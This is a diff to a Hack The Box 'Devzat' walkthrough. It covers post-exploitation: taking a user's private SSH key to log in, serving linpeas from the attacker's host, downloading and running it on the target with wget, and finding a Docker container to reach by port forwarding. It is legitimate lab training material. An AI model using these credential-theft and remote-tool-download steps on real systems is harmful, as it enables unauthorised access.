@@ -20,10 +20,10 @@ output: html_document
 ![desc]({{https://jsom1.github.io/}}/_images/htb_dz_desc.png){: height="300px" width = 320px"}
 </div>
 
-**Ports/services exploited:** ?\\
-**Tools:** dirb, gobuster, git dumper, git extractor, tcpdump\\
-**Techniques:** ?\\
-**Keywords:** Golang (Go)?
+**Ports/services exploited:** 80/http\\
+**Tools:** dirb, gobuster, git dumper, git extractor, tcpdump, linpeas\\
+**Techniques:** enumeration, port forwarding\\
+**Keywords:** Golang (Go), Docker?
 
 **In a nutshell**: ?
 
@@ -338,6 +338,48 @@ It appears the flag is on Catherine's Desktop, and we can't read it as Patrick..
 {:style="color:DarkRed; font-size: 170%;"}
 
 In fact, we don't necessarily have to to do a horizontal privesc. If we can find a way to root directly, we will also be able to read the file on Catherine's desktop. Anyways, we start at the same place in either case, which is **enumeration**.
+
+At this point, the "terminal" we have isn't a proper one. The output of commands such as *ls* is messy, and we can't use commands with *sudo* (we get the following error: *sudo: a terminal is required to read the password*). So, let's start by upgrading to a "proper" terminal by connecting with ssh. We can confirm the username by looking at */.ssh/authorized_keys*. There, we see it's *patrick@devzat*. We then copy the private key contained in */.ssh/id_rsa*, and paste it in a file on our kali machine (I called it *id_rsa* too). We can then connect:
+
+````
+sudo chmod 600 id_rsa
+sudo ssh -i id_rsa patrick@devzat.htb
+`````
+
+I personnally find it easier with this terminal, especially when it comes to manual enumeration. I first wanted to see Patrick's permissions with *sudo -l*, but obviously we can't since we don't have his password yet. I didn't find anything by enumerating manually, so let's upload *linpeas.sh* on the machine.
+
+On Kali, we start a Python web server in the directory in which we have *linpeas.sh*:
+
+````
+sudo python -m SimpleHTTPServer
+`````
+
+This serves a web server on port 8000 by default. Before downloading the script on *devzat*, let's create a *.tmp* directory in */tmp* (so that we can run the script and that it doesn't "spoil" it for other players). Then, From patrick's ssh terminal, we download it as follows:
+
+````
+wget http://10.10.14.9:8000/linpeas.sh
+`````
+
+We must then make it executable, and finally we can run it:
+
+````
+chmod +x linpeas.sh
+./linpeas.sh
+`````
+
+The output is very lengthy and I always stuggle to find the important information within it... I first found a hashed password but it appeared to be a rabbit hole. Unfortunately, I then had to look at another writeup (even though there shouldn't be any since the box is still active... I'm glad I found something though because I was totally stuck and there was nothing on the forum). Here's what should have triggered my curiosity:
+
+<div class="img_container">
+![linpeas]({{https://jsom1.github.io/}}/_images/htb_dz_linpeas.png)
+</div>
+
+There's a Docker container running on the machine, with the IP *172.17.0.2*. This latter is connected to *devzat* by the port 8086 (same port on *devzat* and on the container).\\
+Ideally, we'd like to know what's running inside this container. We could theoretically do it from patrick's terminal with *nmap*, but it isn't installed there and even if we transfer it from Kali, we wouldn't be able to run it (I tried and got a *permission denied*). So, we have to do it through **port forwarding**.
+
+
+
+
+
 
 
 
